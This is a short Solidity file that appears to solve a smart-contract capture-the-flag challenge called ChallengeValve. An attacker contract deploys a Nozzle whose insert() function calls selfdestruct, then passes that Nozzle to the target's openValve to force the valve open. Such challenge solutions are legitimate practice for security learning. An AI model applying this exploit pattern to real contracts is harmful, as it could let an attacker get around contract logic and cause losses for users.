// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import "../ChallengeValve.sol";

contract ChallengeValveAttacker {
    function attack(address target) external {
        Valve challenge = Valve(target);
        Nozzle nozzle = new Nozzle();
        challenge.openValve(nozzle);
    }
}

contract Nozzle is INozzle {
    function insert() external returns (bool) {
        selfdestruct(payable(address(0)));
    }
}
